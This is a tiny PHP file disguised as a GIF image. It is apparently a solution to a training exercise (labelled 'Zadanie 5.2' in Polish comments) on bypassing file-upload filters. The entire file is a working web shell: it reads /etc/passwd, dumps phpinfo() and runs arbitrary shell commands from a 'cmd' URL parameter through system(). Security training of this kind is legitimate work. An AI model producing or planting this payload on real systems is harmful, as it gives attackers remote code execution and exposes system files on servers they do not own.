GIF89a
<?php
// Zadanie 5.2 - plik "udajacy obrazek" (naglowek GIF89a + spoof Content-Type),
// ktory po stronie serwera wykonuje sie jako PHP.

echo "<h2>/etc/passwd</h2><pre>";
readfile('/etc/passwd');                 // odczyt pliku
echo "</pre>";

echo "<h2>phpinfo()</h2>";
phpinfo();                               // informacje o konfiguracji PHP

// (opcjonalnie) pelne RCE:
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd'] . ' 2>&1');
    echo "</pre>";
}
?>
